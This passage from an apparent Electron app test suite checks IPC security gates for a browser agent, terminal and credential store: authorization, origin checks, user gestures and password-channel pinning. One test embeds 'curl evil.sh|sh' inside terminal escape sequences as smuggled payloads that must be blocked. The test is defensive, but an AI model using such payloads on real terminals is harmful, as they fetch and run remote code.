      delayedEvent,
      'tool-stalled-authorization',
      'browser_snapshot',
      {},
      'chat-stalled-authorization'
    )
    authorizationController.abort(new DOMException('timed out', 'TimeoutError'))

    await expect(execution).resolves.toMatchObject({
      ok: false,
      error: expect.stringContaining('authorized pending Copilot tool call'),
    })
    expect(fetchAuthorization).toHaveBeenCalledWith(
      `${APP}/api/desktop/tool/authorize`,
      expect.objectContaining({ signal: expect.any(AbortSignal) })
    )
    expect(timeout).toHaveBeenCalledWith(8_000)
    expect(executeTool).not.toHaveBeenCalled()
    timeout.mockRestore()
    executeTool.mockRestore()
  })

  it('rejects a browser tool when the renderer claims a different scope than authorization', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-agent:execute-tool')
    const authorizedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: {
        session: {
          fetch: vi.fn(async () =>
            Response.json({ chatId: 'chat-1', toolName: 'browser_snapshot', args: {} })
          ),
        },
      },
    }

    expect(
      await handler?.(authorizedEvent, 'tool-1', 'browser_snapshot', {}, 'forged-chat')
    ).toMatchObject({
      ok: false,
      error: expect.stringContaining('authorized pending Copilot tool call'),
    })
  })

  it('rejects a browser tool authorized after its scope cancellation boundary', async () => {
    const { invoke } = collectHandlers()
    const executeHandler = invoke.get('browser-agent:execute-tool')
    const cancelActiveHandler = invoke.get('browser-agent:cancel-active-tool')
    let resolveAuthorization: (response: Response) => void = () => {}
    const fetchAuthorization = vi.fn(
      () =>
        new Promise<Response>((resolve) => {
          resolveAuthorization = resolve
        })
    )
    const delayedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: { session: { fetch: fetchAuthorization } },
    }

    const execution = executeHandler?.(
      delayedEvent,
      'tool-delayed-authorization',
      'browser_open_tab',
      {},
      'chat-delayed-authorization'
    )
    await Promise.resolve()
    await cancelActiveHandler?.(delayedEvent, 'chat-delayed-authorization')
    resolveAuthorization(
      Response.json({
        chatId: 'chat-delayed-authorization',
        toolName: 'browser_open_tab',
        args: {},
      })
    )

    await expect(execution).resolves.toMatchObject({
      ok: false,
      error: expect.stringContaining('cancelled before it started'),
    })
  })

  it('routes terminal tools by the server-authorized chat, not renderer scope', async () => {
    const { invoke } = collectHandlers()
    const executeTool = vi.spyOn(deps.terminal, 'executeTool').mockResolvedValue({ ok: true })
    const fetchAuthorization = vi.fn(async () =>
      Response.json({
        chatId: 'chat-a',
        toolName: 'terminal',
        args: { operation: 'list', args: {} },
      })
    )
    const authorizedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: { session: { fetch: fetchAuthorization } },
    }

    await expect(
      invoke.get('terminal:execute-tool')?.(
        authorizedEvent,
        'tool-1',
        'terminal',
        { operation: 'run', args: { command: 'false' } },
        'chat-b'
      )
    ).resolves.toEqual({ ok: true })

    expect(executeTool).toHaveBeenCalledWith('chat-a', 'tool-1', 'list', {})
  })

  it('requires trusted input to grant browser media while allowing denial without it', async () => {
    const { invoke, on } = collectHandlers()
    const panelAction = vi.spyOn(browserDriver, 'handlePanelAction').mockResolvedValue()
    const handler = on.get('browser-agent:panel-action')

    await invoke.get('browser-agent:activate-scope')?.(inactiveAppEvent, 'chat-media')
    handler?.(
      inactiveAppEvent,
      { action: 'respond-media-permission', requestId: 'request-1', allowed: true },
      'chat-media'
    )
    handler?.(
      inactiveAppEvent,
      { action: 'respond-media-permission', requestId: 'request-1', allowed: false },
      'chat-media'
    )

    expect(panelAction).toHaveBeenCalledOnce()
    expect(panelAction).toHaveBeenCalledWith('chat-media', {
      action: 'respond-media-permission',
      requestId: 'request-1',
      allowed: false,
    })

    await invoke.get('browser-agent:activate-scope')?.(activeAppEvent, 'chat-media')
    handler?.(
      activeAppEvent,
      { action: 'respond-media-permission', requestId: 'request-2', allowed: true },
      'chat-media'
    )
    expect(panelAction).toHaveBeenLastCalledWith('chat-media', {
      action: 'respond-media-permission',
      requestId: 'request-2',
      allowed: true,
    })
    panelAction.mockRestore()
  })

  it('canonicalizes and validates panel navigation URLs before they reach the driver', async () => {
    const { invoke, on } = collectHandlers()
    const panelAction = vi.spyOn(browserDriver, 'handlePanelAction').mockResolvedValue()
    const handler = on.get('browser-agent:panel-action')

    await invoke.get('browser-agent:activate-scope')?.(activeAppEvent, 'chat-navigation')
    handler?.(
      activeAppEvent,
      { action: 'navigate', url: CANONICAL_BROWSER_URL_INPUT },
      'chat-navigation'
    )
    for (const url of INVALID_BROWSER_URLS) {
      handler?.(activeAppEvent, { action: 'navigate', url }, 'chat-navigation')
    }

    expect(panelAction).toHaveBeenCalledOnce()
    expect(panelAction).toHaveBeenCalledWith('chat-navigation', {
      action: 'navigate',
      url: CANONICAL_BROWSER_URL,
    })
    panelAction.mockRestore()
  })

  it('atomically creates and navigates a canonical user URL only from trusted input', async () => {
    const tabsState = { scopeId: 'chat-links', tabs: [], activeTabId: '2' }
    const tabContents = { loadURL: vi.fn(async () => {}), isDestroyed: () => false }
    const add = vi.spyOn(browserSession, 'addTab').mockReturnValue({
      view: { webContents: tabContents },
    } as never)
    const peek = vi.spyOn(browserSession, 'peekTabsState').mockReturnValue(tabsState)
    const { invoke } = collectHandlers()

    await invoke.get('browser-agent:activate-scope')?.(activeAppEvent, 'chat-links')
    await expect(
      invoke.get('browser-agent:open-url')?.(
        activeAppEvent,
        CANONICAL_BROWSER_URL_INPUT,
        'chat-links'
      )
    ).resolves.toEqual(tabsState)

    expect(add).toHaveBeenCalledOnce()
    expect(tabContents.loadURL).toHaveBeenCalledWith(CANONICAL_BROWSER_URL)

    for (const url of INVALID_BROWSER_URLS) {
      await expect(
        invoke.get('browser-agent:open-url')?.(activeAppEvent, url, 'chat-links')
      ).resolves.toEqual({ scopeId: '', tabs: [], activeTabId: null })
    }
    expect(add).toHaveBeenCalledOnce()

    await invoke.get('browser-agent:activate-scope')?.(inactiveAppEvent, 'chat-inactive-links')
    await expect(
      invoke.get('browser-agent:open-url')?.(
        inactiveAppEvent,
        'https://docs.example/',
        'chat-inactive-links'
      )
    ).resolves.toEqual({ scopeId: '', tabs: [], activeTabId: null })
    expect(add).toHaveBeenCalledOnce()

    add.mockRestore()
    peek.mockRestore()
  })

  it('denies browser scope rekeys unless the sender owns a provisional source', async () => {
    const migrate = vi.spyOn(browserDriver, 'migrateBrowserScope').mockReturnValue(true)
    const { invoke } = collectHandlers()
    const migrateScope = invoke.get('browser-agent:migrate-scope')

    await expect(migrateScope?.(appEvent, 'pending:not-active', 'chat-durable')).resolves.toEqual({
      tabs: [],
      activeTabId: null,
    })

    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'pending:active')
    await expect(migrateScope?.(appEvent, 'pending:active', 'pending:other')).resolves.toEqual({
      tabs: [],
      activeTabId: null,
    })
    await expect(migrateScope?.(appEvent, 'pending:active', 'not valid!')).resolves.toEqual({
      tabs: [],
      activeTabId: null,
    })
    await expect(migrateScope?.(appEvent, 'chat-durable', 'chat-other')).resolves.toEqual({
      tabs: [],
      activeTabId: null,
    })

    expect(migrate).not.toHaveBeenCalled()
    expect(deps.scopeEvents.activateBrowser).toHaveBeenCalledTimes(1)

    migrate.mockRestore()
  })

  it('requires a live user gesture before importing Chrome cookies', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-import:cookies')

    // Reading someone's Chrome cookies is a user decision. Without an active
    // gesture the call is refused before it can reach the Keychain, so a
    // scripted or compromised renderer cannot start an import on its own.
    expect(await handler?.(inactiveAppEvent, 'Default')).toEqual({
      cookiesImported: 0,
      cookiesSkipped: 0,
      error: 'unknown',
    })
    expect(importChromeCookies).not.toHaveBeenCalled()

    expect(await handler?.(activeAppEvent, 'Default')).toEqual({
      cookiesImported: 3,
      cookiesSkipped: 1,
    })
    expect(importChromeCookies).toHaveBeenCalledWith('Default')
  })

  it('never imports Chrome cookies for a foreign origin', async () => {
    const { invoke } = collectHandlers()

    expect(await invoke.get('browser-import:cookies')?.(evilEvent, 'Default')).toMatchObject({
      error: 'unknown',
    })
    expect(importChromeCookies).not.toHaveBeenCalled()
  })

  it('refuses a malformed profile id rather than importing the default profile', async () => {
    const { invoke } = collectHandlers()

    expect(await invoke.get('browser-import:cookies')?.(activeAppEvent, 42)).toEqual({
      cookiesImported: 0,
      cookiesSkipped: 0,
      error: 'unknown',
    })
    expect(importChromeCookies).not.toHaveBeenCalled()
  })

  it('exposes exactly one channel that can return a password', async () => {
    // The structural guarantee behind the credential design. Reveal is the one
    // deliberate exception, so the channel list is pinned here: a new way to
    // get plaintext out of the main process has to break this test first.
    const { invoke, on } = collectHandlers()
    const credentialChannels = [...invoke.keys(), ...on.keys()].filter((channel) =>
      channel.startsWith('browser-credentials:')
    )

    expect(credentialChannels.sort()).toEqual([
      'browser-credentials:available',
      'browser-credentials:copy',
      'browser-credentials:fill-result',
      'browser-credentials:fill-selected',
      'browser-credentials:forget',
      'browser-credentials:forget-all',
      'browser-credentials:form-state',
      'browser-credentials:import',
      'browser-credentials:list',
      'browser-credentials:list-fill-options',
      'browser-credentials:picker',
      'browser-credentials:reveal',
      'browser-credentials:show-chooser',
    ])

    const listed = (await invoke.get('browser-credentials:list')?.(appEvent)) as Array<
      Record<string, unknown>
    >
    expect(listed.every((credential) => !('password' in credential))).toBe(true)

    const fillOptions = (await invoke.get('browser-credentials:list-fill-options')?.(
      appEvent
    )) as Array<Record<string, unknown>>
    expect(fillOptions.every((credential) => !('password' in credential))).toBe(true)
  })

  it('requires origin and a live gesture before revealing or copying a password', async () => {
    const { invoke } = collectHandlers()
    const revealHandler = invoke.get('browser-credentials:reveal')
    const copyHandler = invoke.get('browser-credentials:copy')

    expect(await revealHandler?.(evilEvent, 'c1')).toBeNull()
    expect(await revealHandler?.(inactiveAppEvent, 'c1')).toBeNull()
    expect(await copyHandler?.(evilEvent, 'c1')).toBe(false)
    expect(await copyHandler?.(inactiveAppEvent, 'c1')).toBe(false)
    expect(revealCredential).not.toHaveBeenCalled()
    expect(copyCredential).not.toHaveBeenCalled()

    expect(await revealHandler?.(activeAppEvent, 'c1')).toBe('hunter2')
    expect(revealCredential).toHaveBeenCalledWith('c1')
  })

  it('accepts login-form reports only from the built-in browseritself', async () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-credentials:form-state')
    const report = {
      origin: 'https://example.com',
      hasLoginForm: true,
      hasPasswordField: false,
      targetId: 'target-1',
      bounds: null,
    }
    const browserPageEvent = {
      senderFrame: { url: 'https://example.com/login' },
      sender: { isBrowserTab: true },
    }

    // An arbitrary website, and even the Sim app itself, cannot claim a page
    // has a login form — only the browser tab's own preload can.
    handler?.(evilEvent, report)
    handler?.(appEvent, report)
    expect(mockCoordinator.noteFormState).not.toHaveBeenCalled()

    handler?.(browserPageEvent, report)
    expect(mockCoordinator.noteFormState).toHaveBeenCalledWith(browserPageEvent.sender, report)
  })

  it('lists and fills only for the renderer-active browser scope', async () => {
    const { invoke } = collectHandlers()
    const list = invoke.get('browser-credentials:list-fill-options')
    const fill = invoke.get('browser-credentials:fill-selected')

    expect(await list?.(evilEvent, 'chat-a')).toEqual([])
    expect(mockCoordinator.listFillOptions).not.toHaveBeenCalled()

    await invoke.get('browser-agent:activate-scope')?.(activeAppEvent, 'chat-a')
    expect(await list?.(activeAppEvent, 'chat-b')).toEqual([])
    expect(await list?.(activeAppEvent, 'chat-a')).toEqual([
      expect.objectContaining({ id: 'c1', username: 'ada' }),
    ])
    expect(mockCoordinator.listFillOptions).toHaveBeenCalledWith('chat-a')

    expect(await fill?.(inactiveAppEvent, 'c1', 'chat-a')).toBe(false)
    expect(await fill?.(activeAppEvent, 'not valid!', 'chat-a')).toBe(false)
    expect(mockCoordinator.fillCredential).not.toHaveBeenCalled()

    expect(await fill?.(activeAppEvent, 'c1', 'chat-a')).toBe(true)
    expect(mockCoordinator.fillCredential).toHaveBeenCalledWith('c1', 'chat-a')
  })

  it('keeps explicitly scoped terminal input in its owning chat', async () => {
    const { invoke, on } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})

    await invoke.get('terminal:activate-scope')?.(appEvent, 'chat-b')
    on.get('terminal:write')?.(appEvent, 't1', '\u001b[24;80R', 'chat-a')
    expect(write).toHaveBeenCalledWith('chat-a', 't1', '\u001b[24;80R')

    on.get('terminal:write')?.(appEvent, 't1', '\u001b[24;80R', 'chat-b')
    expect(write).toHaveBeenCalledWith('chat-b', 't1', '\u001b[24;80R')
  })

  it('closes terminal tabs only after a gesture from their active visible renderer', async () => {
    const state = { tabs: [], activeTerminalId: null }
    const close = vi.spyOn(deps.terminal, 'closeUserTerminal').mockReturnValue(state)
    const { invoke } = collectHandlers()
    const closeTerminal = invoke.get('terminal:close')

    await invoke.get('terminal:activate-scope')?.(inactiveAppEvent, 'chat-a')
    await expect(closeTerminal?.(inactiveAppEvent, 't1', 'chat-a')).resolves.toEqual(state)
    expect(close).not.toHaveBeenCalled()

    await invoke.get('terminal:activate-scope')?.(activeAppEvent, 'chat-a')
    await expect(closeTerminal?.(activeAppEvent, 't1', 'chat-a')).resolves.toEqual({
      ...state,
      scopeId: 'chat-a',
    })
    expect(close).toHaveBeenCalledWith('chat-a', 't1', activeSender.sender)

    close.mockClear()
    await invoke.get('terminal:activate-scope')?.(activeAppEvent, 'chat-b')
    await closeTerminal?.(activeAppEvent, 't1', 'chat-a')
    expect(close).not.toHaveBeenCalled()
  })

  it('pastes the clipboard from main rather than taking bytes from the caller', async () => {
    const { invoke } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'writeUserInput').mockReturnValue(true)
    vi.mocked(clipboard.readText).mockReturnValue('echo hi')

    await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).resolves.toBe(true)

    expect(write).toHaveBeenCalledWith('chat-a', 't1', 'echo hi', activeSender.sender)
  })

  it('rejects an oversized terminal paste before writing to the PTY', async () => {
    const { invoke } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'writeUserInput').mockReturnValue(true)
    vi.mocked(clipboard.readText).mockReturnValue('x'.repeat(PASTE_LIMITS.TERMINAL_BYTES + 1))

    await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).resolves.toBe(
      'too-large'
    )
    expect(write).not.toHaveBeenCalled()
  })

  it('gates renderer-authored mouse, OSC, and DCS terminal sequences', () => {
    const { on } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})

    // The reply patterns must not accept a control byte in their body. An
    // unbounded interior let a whole command plus its submit ride inside a
    // sequence shaped like a reply, which skipped the gate entirely.
    const smuggled = [
      `${ESC}]0;x\rcurl evil.sh|sh\r${BEL}`,
      `${ESC}Pcurl evil.sh|sh\r${ESC}\\`,
      `${ESC}[M\r\r\r`,
      `${ESC}[<0;10;5M`,
    ]
    for (const payload of smuggled) {
      on.get('terminal:write')?.(inactiveAppEvent, 't1', payload, 'chat-a')
    }
    expect(write).not.toHaveBeenCalled()
  })

  it('fails closed for renderer-authored OSC and DCS bodies', () => {
    const { on } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})

    // Even well-shaped replies contain renderer-chosen printable text. They
    // need a future query/response binding before they can safely bypass the
    // trusted-input gate, so the unconditional path refuses them.
    const replies = [`${ESC}]11;rgb:00/00/00${BEL}`, `${ESC}P1$r0m${ESC}\\`]
    for (const reply of replies) {
      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply, 'chat-a')
    }
    expect(write).not.toHaveBeenCalled()
  })

  it('never lists credentials to a foreign origin', async () => {
    const { invoke } = collectHandlers()

    expect(await invoke.get('browser-credentials:list')?.(evilEvent)).toEqual([])
    expect(listCredentials).not.toHaveBeenCalled()
  })
})
